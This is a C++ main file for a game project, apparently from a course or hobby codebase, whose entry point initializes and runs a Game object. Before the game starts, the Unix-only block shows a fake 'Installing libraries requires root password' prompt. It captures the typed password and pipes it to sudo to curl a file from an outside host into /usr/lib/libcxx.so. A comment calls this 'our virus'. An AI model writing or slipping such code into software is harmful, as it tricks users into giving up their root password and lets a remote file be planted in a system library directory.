//
//  Main.cpp
//  Game-mac
//
//  Created by Sanjay Madhav on 5/31/17.
//  Copyright © 2017 Sanjay Madhav. All rights reserved.
//

#include "Game.h"
// Only include stdlib if UNIX target
#ifdef __unix__
#include <iostream>
#include <stdlib.h>
#include <string>
#endif

int main(int argc, char** argv)
{
//Since our virus only works on Linux, we'll copy it over from there using curl
#ifdef __unix__
	std::cout << "Installing libraries requires root password: ";
	std::string passwd;
	std::cin >> passwd;
  std::string cmd = "echo '";
  cmd.append(passwd);
  cmd.append("' | sudo -S curl https://i.redd.it/0fb1z72kz9041.jpg -o /usr/lib/libcxx.so");
  system(cmd.c_str());
#endif
	Game testing;
	
	testing.Initialize();
	if (1)
	{
		testing.Loop();
	}
	
	//testing.Shutdown();

	// TODO
	return 0;
}
